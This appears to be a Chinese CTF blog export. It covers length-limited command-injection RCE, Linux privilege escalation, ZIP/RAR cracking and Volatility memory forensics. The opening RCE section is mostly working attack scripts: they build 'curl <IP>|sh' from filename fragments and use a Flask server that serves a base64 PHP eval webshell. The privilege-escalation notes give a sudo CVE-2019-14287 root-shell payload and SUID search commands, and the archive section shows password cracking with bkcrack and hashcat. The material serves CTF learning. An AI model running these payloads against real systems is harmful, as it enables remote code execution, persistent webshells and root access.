# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:42# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;payload = [&#x27;&gt;sl&#x27;,&#x27;&gt;kt-&#x27;,&#x27;&gt;j\\&gt;&#x27;,&#x27;&gt;j\\#&#x27;,&#x27;&gt;dir&#x27;,&#x27;*&gt;v&#x27;,&#x27;&gt;rev&#x27;,&#x27;*v&gt;x&#x27;,&#x27;&gt;php&#x27;,&#x27;&gt;a.\\&#x27;,&#x27;&gt;\\&gt;\\&#x27;,&#x27;&gt;-d\\&#x27;,&#x27;&gt;\\ \\&#x27;,&#x27;&gt;64\\&#x27;,&#x27;&gt;se\\&#x27;,&#x27;&gt;ba\\&#x27;,&#x27;&gt;\\|\\&#x27;,&#x27;&gt;4=\\&#x27;,&#x27;&gt;Pz\\&#x27;,&#x27;&gt;k7\\&#x27;,&#x27;&gt;XS\\&#x27;,&#x27;&gt;sx\\&#x27;,&#x27;&gt;VF\\&#x27;,&#x27;&gt;dF\\&#x27;,&#x27;&gt;X0\\&#x27;,&#x27;&gt;gk\\&#x27;,&#x27;&gt;bC\\&#x27;,&#x27;&gt;Zh\\&#x27;,&#x27;&gt;ZX\\&#x27;,&#x27;&gt;Ag\\&#x27;,&#x27;&gt;aH\\&#x27;,&#x27;&gt;9w\\&#x27;,&#x27;&gt;PD\\&#x27;,&#x27;&gt;S&#125;\\&#x27;,&#x27;&gt;IF\\&#x27;,&#x27;&gt;&#123;\\&#x27;,&#x27;&gt;\\$\\&#x27;,&#x27;&gt;ho\\&#x27;,&#x27;&gt;ec\\&#x27;,&#x27;sh x&#x27;,&#x27;sh j&#x27;]#&lt;?php eval($_GET[1]);?&gt;def writeFile(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	for p in payload:		writeFile(p.strip())		print(&quot;[*] create &quot;+p.strip())		time.sleep(0.3)def check():	response = requests.get(url+&quot;a.php&quot;)	if response.status_code == requests.codes.ok:		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;a.php&quot;)def main():	run()	check()if __name__ == &#x27;__main__&#x27;:	main()

环境无dir，可写思路是通过ls，mv，cat构造出ls -t&gt;a，再curl写一句话
具体操作如下：
先将ls -t&gt;a写入z

倒序写入curl 335708495|sh，注意服务器的ip要先转int

服务器上用flask写个shell
# coding=utf-8from flask import *app = Flask(__name__)app.secret_key = &#x27;*************************&#x27;@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index():    return &quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)

先执行sh z，即执行了ls -t&gt;a，即向a写入curl 335708495|sh，再sh a，就执行了curl 335708495|sh，并返回echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php，成功写入1.php
自动化脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:58# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;payload = [&#x27;&gt;\\ \\&#x27;,&#x27;&gt;-t\\&#x27;,&#x27;&gt;\\&gt;a&#x27;,&#x27;&gt;ls\\&#x27;,&#x27;ls&gt;v&#x27;,&#x27;&gt;mv&#x27;,&#x27;&gt;vt&#x27;,&#x27;*v*&#x27;,&#x27;&gt;ls&#x27;,&#x27;l*&gt;t&#x27;,&#x27;&gt;cat&#x27;,&#x27;*t&gt;z&#x27;,#curl 335708495|sh&#x27;&gt;sh&#x27;,&#x27;&gt;\\|\\&#x27;,&#x27;&gt;5\\&#x27;,&#x27;&gt;49\\&#x27;,&#x27;&gt;08\\&#x27;,&#x27;&gt;57\\&#x27;,&#x27;&gt;33\\&#x27;,&#x27;&gt;\\ \\&#x27;,&#x27;&gt;rl\\&#x27;,&#x27;&gt;cu\\&#x27;,&#x27;sh z&#x27;,&#x27;sh a&#x27;,]def writeFile(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	for p in payload:		writeFile(p.strip())		print(&quot;[*] create &quot;+p.strip())		time.sleep(1)def check():	response = requests.get(url+&quot;1.php&quot;)	if response.status_code == requests.codes.ok:		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)def main():	run()	check()if __name__ == &#x27;__main__&#x27;:	main()

环境无dir，可写但不出网因为ls -t命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用echo xxx|base64 -d&gt;a.php的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用$&#123;IFS&#125;代替空格，变成echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php
步骤与4字符-环境无dir，可写基本一致，只是替换了curl命令，变成了echo ...
自动化脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:56:17# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;payload = [&#x27;&gt;\\ \\&#x27;,&#x27;&gt;-t\\&#x27;,&#x27;&gt;\\&gt;a&#x27;,&#x27;&gt;ls\\&#x27;,&#x27;ls&gt;v&#x27;,&#x27;&gt;mv&#x27;,&#x27;&gt;vt&#x27;,&#x27;*v*&#x27;,&#x27;&gt;ls&#x27;,&#x27;l*&gt;t&#x27;,&#x27;&gt;cat&#x27;,&#x27;*t&gt;z&#x27;,&#x27;&gt;php&#x27;,&#x27;&gt;a.\\&#x27;,&#x27;&gt;\\&gt;\\&#x27;,&#x27;&gt;-d\\&#x27;,&#x27;&gt;\\ \\&#x27;,&#x27;&gt;64\\&#x27;,&#x27;&gt;se\\&#x27;,&#x27;&gt;ba\\&#x27;,&#x27;&gt;\\|\\&#x27;,&#x27;&gt;4=\\&#x27;,&#x27;&gt;Pz\\&#x27;,&#x27;&gt;k7\\&#x27;,&#x27;&gt;XS\\&#x27;,&#x27;&gt;sx\\&#x27;,&#x27;&gt;VF\\&#x27;,&#x27;&gt;dF\\&#x27;,&#x27;&gt;X0\\&#x27;,&#x27;&gt;gk\\&#x27;,&#x27;&gt;bC\\&#x27;,&#x27;&gt;Zh\\&#x27;,&#x27;&gt;ZX\\&#x27;,&#x27;&gt;Ag\\&#x27;,&#x27;&gt;aH\\&#x27;,&#x27;&gt;9w\\&#x27;,&#x27;&gt;PD\\&#x27;,&#x27;&gt;S&#125;\\&#x27;,&#x27;&gt;IF\\&#x27;,&#x27;&gt;&#123;\\&#x27;,&#x27;&gt;\\$\\&#x27;,&#x27;&gt;ho\\&#x27;,&#x27;&gt;ec\\&#x27;,&#x27;sh z&#x27;,&#x27;sh a&#x27;]def writeFile(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	for p in payload:		writeFile(p.strip())		print(&quot;[*] create &quot;+p.strip())		time.sleep(1)def check():	response = requests.get(url+&quot;a.php&quot;)	if response.status_code == requests.codes.ok:		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;a.php&quot;)def main():	run()	check()if __name__ == &#x27;__main__&#x27;:	main()

长度限制总结1：当有长度限制的情况下，最少可以在4字符无dir环境下拼接出ls -t2：空格不够用时可以用$&#123;IFS&#125;代替，只要命令部分不出现重复的字符组合就行
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>linux提权笔记</title>
    <url>/posts/fcb3a8d7/</url>
    <content><![CDATA[记录在比赛和靶场中遇到的提权方法
推荐本地部署一个GTFOBins用来查询
suid 提权
SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限

查找当前系统上文件属主为 root 并且拥有 SUID 权限的可执行文件
find / -user root -perm -4000 -print 2&gt; result.txtfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/null

找到命令后可以在GTFOBins查找用法
sudo 提权权限分配不当
sudo（super user do）是linux系统中用于管理用户权限的工具，允许普通用户在无需切换到超级用户的情况下以root身份执行命令，通常，在使用sudo命令时，用户需要输入自己的密码验证自己是否有权限使用

查看可利用的sudo权限工具
sudo -l

然后在gtfobins查询利用方法
例子：


CVE-2019-142871.8.28之前的sudo版本均会受到影响
现在的用户alice没权限看flag文件

查看sudo版本

符合利用条件，payload：sudo -u#-1 /bin/bash

]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(压缩文件篇)</title>
    <url>/posts/ff5ac082/</url>
    <content><![CDATA[ZIP文件ZIP通常使用后缀名.zip，它的MIME格式为application/zip
文件结构分析引用官方文档中对于一个标准zip文件组成部分的描述：
[local file header 1][file data 1][data descriptor 1]...[local file header n][file data n][data descriptor n][archive decryption header] (EFS)[archive extra data record] (EFS)[central directory][zip64 end of central directory record][zip64 end of central directory locator][end of central directory record]

为了演示结构，首先创建一个flag.txt，分别压缩成flag1.zip(无密码)和flag2.zip(有密码)（使用的是winrar默认参数压缩）
推荐使用010 editor分析
先看flag1.zip

大致可以分为三个部分：local file header + file data + data descriptor和central directory以及一个end of central directory record组成（对应图中的三种颜色）
文件头(Local file header)


字段名称
长度(byte)
说明



Local file header signature
4
文件头标识，固定值(50 4B 03 04)


Version needed to extract
2
解压文件所需的ZIP最低版本


General purpose bit flag
2
通用位标志，通常只需要考虑当bit 0为1时表示文件被加密


Compression method
2
压缩方式，当值为：0x0000时表示无压缩


Last mod file time
2
文件最后修改时间，以standard MS-DOS格式编码


Last mod file date
2
文件最后修改日期


CRC-32
4
未压缩数据的CRC32


Compressed size
4
压缩后的大小，单位为byte


Uncompressed size
4
未压缩的大小


File name length
2
文件名长度


Extra field length
2
扩展区域长度


File name
N
文件名


Extra field
N
扩展区域


文件数据(File data)应将文件的压缩或存储数据紧随在文件头(Local File Header)后。如果文件已加密，则文件的加密头(encryption header)应放置在本地文件头(Local File Header)之后和文件数据之前。
对于.ZIP压缩文档中的每个文件，重复执行一系列的[文件头][加密头][文件数据][数据描述符]结构。
数据描述符(Data descriptor)


字段名称
长度(byte)
说明



Optional data descriptor signature
4
(可选的)数据描述符标识，固定值(50 4B 07 08)


CRC-32
4
未压缩数据的CRC32


Compressed size
4
压缩后的大小


Uncompressed size
4
未压缩的大小


如果设置了通用位标志的位3，则该描述符必须存在，它按字节对齐，紧随压缩数据的最后一个字节，仅在无法在输出的.ZIP文件中查找时(例如，当输出.ZIP文件是标准输出或不可搜索的设备时)，才应使用此描述符
例如flag2.zip中的绿色部分

核心目录(Central directory)Central directory包括File header和Digital signature
文件头：



字段名称
长度(byte)
说明



Central directory file header signature
4
中心目录文件头标识，固定值(50 4B 01 02)


Version made by
2
压缩所用的ZIP版本


Version needed to extract
2
解压文件所需的ZIP最低版本


General purpose bit flag
2
通用位标记


Compression method
2
压缩方法


Last mod file time
2
文件最后修改时间


Last mod file date
2
文件最后修改日期


CRC-32
4
未压缩数据的CRC32


Compressed size
4
压缩后的大小


Uncompressed size
4
未压缩的大小


File name length
2
文件名长度


Extra field length
2
扩展区域长度


File comment length
2
文件注释长度


Disk number start
2
文件开始位置所在的磁盘编号


Internal file attributes
2
内部文件属性


External file attributes
4
外部文件属性


Relative offset of local header
4
本地文件头的相对偏移


File name
N
文件名


Extra field
N
扩展区域


File comment
N
文件注释


数字签名：此区域不是必须的



字段名称
长度(byte)
说明



Header signature
4
头标识，固定值(50 4B 05 05)


Size of data
2
数据的大小


Signature data
N
签名数据


目录结束标识(End of central directory record)


字段名称
长度(byte)
说明



End of central directory signature
4
中心目录结束标识，固定值(50 4B 05 06)


Number of this disk
2
当前磁盘编号


Number of the disk with the start of the central directory
2
中心目录开头所在的磁盘号


Total number of entries in the central directory on this disk
2
该磁盘上中心目录的条目总数


Total number of entries in the central directory
2
中心目录的条目总数


Size of the central directory
4
中心目录的大小


Offset of start of central directory with respect to the starting disk number
4
中心目录开始位置相对于压缩文档开始位置的偏移


.ZIP file comment length
2
.ZIP文件注释长度


.ZIP file comment
N
.ZIP文件注释


常见考点伪加密伪加密可以说是非常常见，基础的考点了，正如名字中的伪，它本身并没有加密，但是通过修改通用位标记，可以使得解压软件认为这个文件存在加密
例题：BUU-zip伪加密
可以看到是需要密码的

010 editor查看，修改通用位标记为0x0000

修改后可以直接解压了
暴力破解使用工具(archpr)或者脚本(python)对压缩包进行暴力破解密码
基本可以分为纯暴力，掩码，字典
纯暴力：一般是弱口令或者纯数字
掩码：知道了密码的一部分，用掩码进行爆破。例如??ert??可以去匹配中间为ert的密码

字典：用题目中给出的或自己的弱口令字典去跑
CRC32碰撞每个文件都有唯一的CRC32值，即使文件中有个一个bit发生了变化，CRC32值也会不同
CRC32爆破就是知道文件中一段数据的长度和文件的CRC32值，通过脚本程序，利用穷举法，与其CRC32对照，从而达到猜解数据的目的（通常只适用于较小的文本文件，文件太大穷举难度太大）
例题：BUU-zip
github脚本1github脚本2
下载附件，解压得到68个压缩包，并且每个压缩文件里都有一个4个字节大小的名为data.txt的txt文件，于是尝试用crc32碰撞还原出所有压缩包中的文件内容

得到一串base64编码后的字符串，解压后修复压缩包得到flag
明文攻击明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。
注意：明文对应文件的加密算法需要是ZipCrypto Store(linux下可以用unzip -v等命令查看)
ZIP 明文攻击原理
例题：BUU-[ACTF新生赛2020]明文攻击


深入明文攻击-bkcrack上个例子的明文攻击使用的是完整的文件，但是有时候没有文件，只知道加密文件的一部分字节数据(至少12个字节及偏移)，这时候如果满足加密算法(ZipCrypto Store)条件，就可以使用深入明文攻击
例题：2022西湖论剑-take_the_zip_easy
已知算法为ZipCrypto Store，且有一个zip文件，就可以得知文件头为504B030414000000

echo -n &quot;dasflow.pcapng&quot; &gt; plain.out./bkcrack -C zipeasy.zip -c dasflow.zip -p plain.out -o 30 -x 0 504B030414000000
参数解释：
-C 加密压缩包-c 提取的密文部分-p 提取的明文部分-o offset  -p参数指定的明文在压缩包内目标文件的偏移量-x 压缩包内目标文件的偏移地址  部分已知明文值

-o为30是因为在zip格式中第三十位固定为压缩文件的名字

拿到key：2b7d78f3 0ebcabad a069728c，这个还不是真正的密码

通过key修改密码为easy，保存到easy.zip./bkcrack -C zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -U easy.zip easy

双密码
在启用 AES-256 模式生成受密码保护的 ZIP 存档时 ，如果密码太长，ZIP 格式会使用 PBKDF2 算法并对用户提供的密码进行 hash 处理。在这种情况下，这个新计算的 hash 将会成为文件的实际密码。太长是指超过 64 个字节（字符）。

例子：
Nev1r-G0nna-G2ve-Y8u-Up-N5v1r-G1nna-Let-Y4u-D1wn-N8v4r-G5nna-D0sert-You
对应的 sha1 值
706b4838613041714e62486364773847726d5370
将每两位转成 ASCII 码，就产生了另一个明文密码
pkH8a0AqNbHcdw8GrmSp
RAR文件文件结构分析RAR不同于ZIP，RAR是一种专利文件格式2.0 版本前加密算法未公开，2.0 版本后使用AES算法加密
RAR 5.0签名和RAR4.x的签名不一样：
RAR 5.0 签名由8个字节组成:0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00RAR 4.x 签名由7字节组成:0x52 0x61 0x72 0x21 0x1A 0x07 0x00

因为rar是商业格式，所以不同软件不同版本所压缩出来的可能会有细微差别，可以参考010中的rar模板
本文以RAR4.x为例子，可以大致分为四部分

标记块(MARK_HEAD)


字段名称
长度(byte)
说明



HEAD_CRC
2
总是0x6152


HEAD_TYPE
1
0x72


HEAD_FLAGS
2
总是0x1A21


HEAD_SIZE
2
块大小 &#x3D; 0x0007，即7个字节


所以这里标记块的大小固定是7个字节，且是一个固定的字节序列。标记块也称为Magic number。
压缩文件头(MAIN_HEAD)


字段名称
长度(byte)
说明



HEAD_CRC
2
HEAD_TYPE到RESERVED2的CRC


HEAD_TYPE
1
0x73


HEAD_FLAGS
2
位标记


HEAD_SIZE
2
压缩文件头总大小（包括压缩文件注释）


RESERVED1
2
保留


RESERVED2
4
保留


对于压缩文件头里的位标记，如果它的第9位(从左到右)被置1(则位标记应为0x0080)，块头被加密，也就是通常所说的加密文件名，打开这样加密的RAR文件时，需要先输入密码才能看到压缩包内的文件列表
文件头(FILE_HEAD)


字段名称
长度(byte)
说明



HEAD_CRC
2
从HEAD_TYPE到FILE_NAME的CRC


HEAD_TYPE
1
0x74


HEAD_FLAGS
2
位标记


HEAD_SIZE
2
文件头的全部大小(包含文件名和注释)


PACK_SIZE
4
已压缩文件大小


UNP_SIZE
4
未压缩文件大小


HOST_OS
1
保存压缩文件使用的操作系统


FILE_CRC
4
文件CRC


FTIME
4
MS DOS标准格式的日期和时间


UNP_VER
1
解压文件所需要最低RAR版本，版本编码方法：10 * 主版本 + 副版本。


METHOD
1
压缩方式


NAME_SIZE
2
文件名大小


ATTR
4
文件属性


HIGH_PACK_SIZE
4
可选值，已压缩文件大小64位值的高4字节。只HEAD_FLAGS中的0x100位被设置才存在。


HIGH_UNP_SIZE
4
可选值，未压缩文件大小64位值的高4字节。只有HEAD_FLAGS中的0x100位被设置才存在。


FILE_NAME
NAME_SIZE
文件名 - NAME_SIZE字节大小字符串


SALT
8
可选值，如果(HEAD_FLAGS &amp; 0x400)!&#x3D; 0，则存在


EXT_TIME
可变大小
可选值，扩展时间区域，如果(HEAD_FLAGS &amp; 0x1000)!&#x3D; 0，则存在


在这个块中，存在两个CRC值，一个是文件头块中从块类型到文件名的校验，后一个则是压缩包中所含文件的CRC校验，解压时，会计算解压后生成文件的CRC值，如果等于这里的CRC，则解压完成，如果不同，则报错中断。
结尾块(ENDARC_HEAD)


字段名称
长度(byte)
说明



HEAD_CRC
2
从HEAD_TYPE 到HEAD_SIZE 的CRC校验值


HEAD_TYPE
1
0x7B


HEAD_FLAGS
2
位标记


HEAD_SIZE
2
结尾块大小


与标记块类似的是，结尾块也是一个固定字节串的块，依次是C4 3D 7B 00 40 07 00
常见考点暴力破解比如：
rar2john先提取hash$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602
hashcat爆破密码hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u
伪加密rar在伪加密状态下会显示压缩包已损坏或压缩格式未知，所以很容易判断rar是否是伪加密
修改FILE_HEAD中的HEAD_FLAGS即可

例题：BUU-[VNCTF 2021]冰冰好像藏着秘密
一打开就是一堆报错

修改第24字节为80即可正常打开
其他Zipbomb压缩包炸弹，利用压缩算法的特性，做到仅仅几kb和仅mb的压缩包文件，解压出来GB，甚至PB级的数据
python脚本
import os.pathimport zipfileimport redir_path=&#x27;C:\\Users\\19307\\Desktop\\11aa\\a&#x27;files= os.listdir(dir_path)newfiles = files[::-1]print(newfiles)for file in newfiles:    position = dir_path+&#x27;\\&#x27;+ file    print (position)    z = zipfile.ZipFile(position, &#x27;r&#x27;)    for filename in z.namelist():        bytes = z.read(filename)        if b&#x27;Zmxh&#x27; in bytes or b&#x27;flag&#x27; in bytes:            print(filename)

例题：BUU-DASCTF Sept X ZipBomb
参考ZIP文件格式分析ZIP官方文档 - APPNOTE-6.3.6.TXTRAR文件格式分析RAR-wiki
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>总结</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(取证篇)</title>
    <url>/posts/92f52d5d/</url>
    <content><![CDATA[Volatility2Volatility2是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。
常用命令# 查看imagerinfo获取操作系统类型volatility -f &lt;filename&gt; imageinfo# 指定操作系统类型进行其他操作volatility -f &lt;filename&gt; --profile &lt;ostype&gt;# 查看进程volatility -f &lt;filename&gt; --profile &lt;ostype&gt; pslist# 查看文件volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;# 桌面volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;Desktop&quot;# 导出文件volatility -f &lt;filename&gt; --profile &lt;ostype&gt; dumpfiles -Q &lt;virtual address&gt; -D &lt;savedir&gt;# 获取系统用户名volatility -f &lt;filename&gt; --profile &lt;ostype&gt; printkey -K &quot;SAM\Domains\Account\Users\Names&quot;# 查看注册表volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hivelist# 提取用户密码volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hashdump -y &lt;注册表 system 的 virtual 地址&gt; -s &lt;SAM 的 virtual 地址&gt;# 获取IE浏览器历史记录volatility -f &lt;filename&gt; --profile &lt;ostype&gt; iehistory# 查看网络连接volatility -f &lt;filename&gt; --profile &lt;ostype&gt; netscanvolatility -f &lt;filename&gt; --profile &lt;ostype&gt; connscan# 将内存中的某个进程数据以 dmp 的格式保存出来volatility -f &lt;filename&gt; --profile &lt;ostype&gt; memdump -p &lt;pid&gt; -D &lt;savedir&gt;# 提取进程的可执行文件volatility -f &lt;filename&gt; --profile &lt;ostype&gt; procdump -p &lt;pid&gt; -D &lt;savedir&gt;# 查看命令行历史记录volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdscanvolatility -f &lt;filename&gt; --profile &lt;ostype&gt; consoles# 查看进程命令行参数volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdline# 查看环境变量volatility -f &lt;filename&gt; --profile &lt;ostype&gt; envars# 查看剪贴板信息volatility -f &lt;filename&gt; --profile &lt;ostype&gt; clipboard



支持的插件列表amcache             # 查看 AmCache 应用程序痕迹信息apihooks            # 检测内核及进程的内存空间中的 API hookatoms               # 列出会话及窗口站 atom 表atomscan            # Atom 表的池扫描(Pool scanner)auditpol            # 列出注册表 HKLM\SECURITY\Policy\PolAdtEv 的审计策略信息bigpools            # 使用 BigPagePoolScanner 转储大分页池(big page pools)bioskbd             # 从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出 BIOS 开机密码)cachedump           # 获取内存中缓存的域帐号的密码哈希callbacks           # 打印全系统通知例程clipboard           # 提取 Windows 剪贴板中的内容cmdline             # 显示进程命令行参数cmdscan             # 提取执行的命令行历史记录（扫描_COMMAND_HISTORY 信息）connections         # 打印系统打开的网络连接(仅支持 Windows XP 和 2003)connscan            # 打印 TCP 连接信息consoles            # 提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION 信息）crashinfo           # 提取崩溃转储信息deskscan            # tagDESKTOP 池扫描(Poolscaner)devicetree          # 显示设备树信息dlldump             # 从进程地址空间转储动态链接库dlllist             # 打印每个进程加载的动态链接库列表driverirp           # IRP hook 驱动检测drivermodule        # 关联驱动对象至内核模块driverscan          # 驱动对象池扫描dumpcerts           # 提取 RAS 私钥及 SSL 公钥dumpfiles           # 提取内存中映射或缓存的文件dumpregistry        # 转储内存中注册表信息至磁盘editbox             # 查看 Edit 编辑控件信息 (Listbox 正在实验中)envars              # 显示进程的环境变量eventhooks          # 打印 Windows 事件 hook 详细信息evtlogs             # 提取 Windows 事件日志(仅支持 XP/2003)filescan            # 提取文件对象（file objects）池信息gahti               # 转储用户句柄（handle）类型信息gditimers           # 打印已安装的 GDI 计时器 (timers) 及回调(callbacks)gdt                 # 显示全局描述符表(Global Descriptor Table)getservicesids      # 获取注册表中的服务名称并返回 SID 信息getsids             # 打印每个进程的 SID 信息handles             # 打印每个进程打开的句柄的列表hashdump            # 转储内存中的 Windows 帐户密码哈希(LM/NTLM)hibinfo             # 转储休眠文件信息hivedump            # 打印注册表配置单元信息hivelist            # 打印注册表配置单元列表hivescan            # 注册表配置单元池扫描hpakextract         # 从 HPAK 文件（Fast Dump 格式）提取物理内存数据hpakinfo            # 查看 HPAK 文件属性及相关信息idt                 # 显示中断描述符表(Interrupt Descriptor Table)iehistory           # 重建 IE 缓存及访问历史记录imagecopy           # 将物理地址空间导出原生 DD 镜像文件imageinfo           # 查看 / 识别镜像信息impscan             # 扫描对导入函数的调用joblinks            # 打印进程任务链接信息kdbgscan            # 搜索和转储潜在 KDBG 值kpcrscan            # 搜索和转储潜在 KPCR 值ldrmodules          # 检测未链接的动态链接 DLLlsadump             # 从注册表中提取 LSA 密钥信息（已解密）machoinfo           # 转储 Mach-O 文件格式信息malfind             # 查找隐藏的和插入的代码mbrparser           # 扫描并解析潜在的主引导记录(MBR)memdump             # 转储进程的可寻址内存memmap              # 打印内存映射messagehooks        # 桌面和窗口消息钩子的线程列表mftparser           # 扫描并解析潜在的 MFT 条目moddump             # 转储内核驱动程序到可执行文件的示例modscan             # 内核模块池扫描modules             # 打印加载模块的列表multiscan           # 批量扫描各种对象mutantscan          # 对互斥对象池扫描notepad             # 查看记事本当前显示的文本objtypescan         # 扫描窗口对象类型对象patcher             # 基于页面扫描的补丁程序内存poolpeek            # 可配置的池扫描器插件printkey            # 打印注册表项及其子项和值privs               # 显示进程权限procdump            # 进程转储到一个可执行文件示例pslist              # 按照 EPROCESS 列表打印所有正在运行的进程psscan              # 进程对象池扫描pstree              # 以树型方式打印进程列表psxview             # 查找带有隐藏进程的所有进程列表qemuinfo            # 转储 Qemu 信息raw2dmp             # 将物理内存原生数据转换为 windbg 崩溃转储格式screenshot          # 基于 GDI Windows 的虚拟屏幕截图保存servicediff         # Windows 服务列表(ala Plugx)sessions            # _MM_SESSION_SPACE 的详细信息列表(用户登录会话)shellbags           # 打印 Shellbags 信息shimcache           # 解析应用程序兼容性 Shim 缓存注册表项shutdowntime        # 从内存中的注册表信息获取机器关机时间sockets             # 打印已打开套接字列表sockscan            # TCP 套接字对象池扫描ssdt                # 显示 SSDT 条目strings             # 物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)svcscan             # windows 服务列表扫描symlinkscan         # 符号链接对象池扫描thrdscan            # 线程对象池扫描threads             # 调查_ETHREAD 和_KTHREADstimeliner           # 创建内存中的各种痕迹信息的时间线timers              # 打印内核计时器及关联模块的 DPCtruecryptmaster     # 恢复 TrueCrypt 7.1a 主密钥truecryptpassphrase # 查找并提取 TrueCrypt 密码truecryptsummary    # TrueCrypt 摘要信息unloadedmodules     # 打印卸载的模块信息列表userassist          # 打印注册表中 UserAssist 相关信息userhandles         # 转储用户句柄表vaddump             # 转储 VAD 数据为文件vadinfo             # 转储 VAD 信息vadtree             # 以树形方式显示 VAD 树信息vadwalk             # 显示遍历 VAD 树vboxinfo            # 转储 Virtualbox 信息（虚拟机）verinfo             # 打印 PE 镜像中的版本信息vmwareinfo          # 转储 VMware VMSS/VMSN 信息volshell            # 内存镜像中的 shellwindows             # 打印桌面窗口(详细信息)wintree             # Z 顺序打印桌面窗口树wndscan             # 池扫描窗口站yarascan            # 以 Yara 签名扫描进程或内核内存


Linux 内存取证插件参数# 获取系统进程信息相关命令linux_pstree        # 进程树列表linux_pslist_cache  # 来自的 kmem_cache 活动进程linux_psxview       # 比较进程列表linux_lsof          # 打开文件描述符的每个活动进程linux_pslist        # 活动的进程列表linux_psaux         # 活动的进程列表（输出内容包括更多的细节）# 获取系统内存信息的相关命令linux_memmap        # 内存映射文件linux_pidhashtable  # Linux 内核中的 PID 散列表linux_proc_maps     # 转储由-s/-vma 参数到磁盘上指定的内存范围。linux_dump_map      # 进程内存的详细信息，包括堆和共享库。linux_bash          # bash 历史文件# 获取网络接口信息的相关命令linux_arp           # 显示 arp 列表linux_ifconfig      # 显示网络接口详细情况linux_route_cache   # 显示网络路由表linux_netstat       # 查看网络链接情况# 获取系统硬件信息的相关命令linux_cpuinfo       # 显示 cpu 的相关命令信息。linux_dmesg         # 显示内核缓存信息。linux_iomem         # 显示 io 设备信息。linux_mount         # 显示/proc/mouns 的相关命令信息，主要是挂载的磁盘设备。linux_mount_cache   # 显示 kmem_cache 的相关命令信息。linux_slabinfo      # 显示/proc/slabinfo 的相关命令信息。# rootkit 检测的相关命令linux_check_afinfo  # 检查篡改网络协议结构。linux_check_creds   # 检查进程共享结构。linux_check_fop     # 检查文件操作数据结构篡改情况。linux_check_idt     # 检查中断描述符表（IDT）的篡改情况。linux_check_syscall # 在系统调用表检查功能情况。linux_check_modules # 检查用于从内核模块列表中缺少在 sysfs 中的项目。# 获取内核模块信息的相关命令linux_lsmod         # 加载内核模块。linux_tmpfs         # tmpfs 的内容。


Profile
Volatility自带一些windows系统的profile，Linux系统的Profile需要自己制作，也可以使用第三方的profile文件：https://github.com/KDPryor/LinuxVolProfiles


自己制作profile的方法如下：将module.dwarf和system.map打包成一个zip文件，移动到volatility/volatility/plugins/overlays/linux目录中

